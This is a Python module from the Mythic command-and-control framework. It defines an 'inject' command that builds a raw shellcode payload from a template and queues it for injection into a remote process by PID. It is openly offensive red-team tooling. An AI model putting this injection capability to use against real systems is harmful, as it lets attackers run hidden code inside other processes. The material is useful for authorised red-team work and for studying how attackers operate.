from CommandBase import *
import json
from MythicFileRPC import *
from MythicPayloadRPC import *


class InjectArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "template": CommandParameter(name="Payload Template", type=ParameterType.Payload),
            "pid": CommandParameter(name="PID", type=ParameterType.Number),
            "arch": CommandParameter(name="Architecture", type=ParameterType.ChooseOne, choices=["x64", "x86"])
        }

    errorMsg = "Missing required parameter: {}"

    async def parse_arguments(self):
        if (self.command_line[0] != "{"):
            raise Exception("Inject requires JSON parameters and not raw command line.")
        self.load_args_from_json_string(self.command_line)


class InjectCommand(CommandBase):
    cmd = "inject"
    needs_admin = False
    help_cmd = "inject (modal popup)"
    description = "Inject agent shellcode into a remote process."
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = InjectArguments
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        gen_resp = await MythicPayloadRPC(task).build_payload_from_template(task.args.get_arg('template'),
                                                                            description=task.operator + "'s injection into " + str(task.args.get_arg("pid")))
        if gen_resp.status == MythicStatus.Success:
            # we know a payload is building, now we want it
            while True:
                resp = await MythicPayloadRPC(task).get_payload_by_uuid(gen_resp.uuid)
                if resp.status == MythicStatus.Success:
                    if resp.build_phase == 'success':
                        if len(resp.contents) > 1 and resp.contents[:2] == b"\x4d\x5a":
                            raise Exception("Inject requires a payload of Raw output, but got an executable.")
                        # it's done, so we can register a file for it
                        file_resp = await MythicFileRPC(task).register_file(resp.contents)
                        if file_resp.status == MythicStatus.Success:
                            task.args.add_arg("template", file_resp.agent_file_id)
                            break
                        else:
                            raise Exception("Failed to register payload: " + file_resp.error_message)
                    elif resp.build_phase == 'error':
                        raise Exception("Failed to build new payload: " + resp.error_message)
                    else:
                        await asyncio.sleep(1)
        else:
            raise Exception("Failed to build payload from template {}".format(task.args.get_arg("template")))
        return task

    async def process_response(self, response: AgentResponse):
        pass